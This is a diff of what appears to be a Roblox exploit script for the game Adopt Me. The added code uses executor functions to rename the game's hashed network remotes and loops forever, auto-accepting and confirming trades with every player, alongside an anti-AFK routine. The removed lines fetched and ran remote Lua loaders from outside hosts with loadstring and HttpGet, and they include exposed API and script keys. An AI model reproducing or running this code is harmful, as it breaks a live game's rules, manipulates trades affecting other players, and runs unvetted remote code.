@@ -1,26 +1,50 @@
+-- Wait until the game fully loads
+repeat task.wait() until game:IsLoaded()
+
+-- Function to rename remotes
+local function rename(remotename, hashedremote)
+    hashedremote.Name = remotename
+end
+
+-- Attempt to rename all upvalues from your RouterClient init
+local RouterClient = require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load("RouterClient")
+table.foreach(getupvalue(RouterClient.init, 7), rename)
+
+-- Wait 5 seconds before executing the next part
+task.wait(5)
+
+-- Main loop task
 task.spawn(function()
-    task.wait(35)
-    getgenv().API_KEY = "JRxd3MCtzUKSfowmCNAfuTS4a"
-    getgenv().GroupName = "vps3"
-    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
+    task.wait(20) -- Initial delay
+    local function executeOnPlayers()
+        local Players = game:GetService("Players")
+        for _, player in ipairs(Players:GetPlayers()) do
+            task.wait(0.1)
+            pcall(function()
+                print(player.Name)
+                local args = {
+                    [1] = game:GetService("Players"):WaitForChild(player.Name),
+                    [2] = true
+                }
+
+                local ReplicatedStorage = game:GetService("ReplicatedStorage")
+                ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(unpack(args))
+                ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
+                ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()
+            end)
+        end
+    end
+
+    while true do
+        task.wait(5)
+        executeOnPlayers()
+    end
 end)
 
-task.spawn(function()
-    script_key="eLIDhlHHJKGKrJEWjsujiNyjojztmUVZ";
-getgenv().Config = {
-    ["PetAMountToBuy"] = "0", -- can be 999
-    ["PetRemoteToBuy"] = "moon_2025_egg",
-
-    ["PetFarmAutoSwitchFullGrown"] = false,
-    ["PetFarmActive"] = false,
-    ["LitePetFarmActive"] = true,
-    ["EggFarmActive"] = false,
-    
-    ["HideUselessGui"] = true,
-    ["Blur_username"] = true,
-    ["Blazing_Lion_Log"] = false,
-    ["DiscordId"] = "123456",
-    ["Webhook"] = "",
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
+-- Anti-AFK script
+local VirtualUser = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:Connect(function()
+    VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+    task.wait(1)
+    VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
 end)
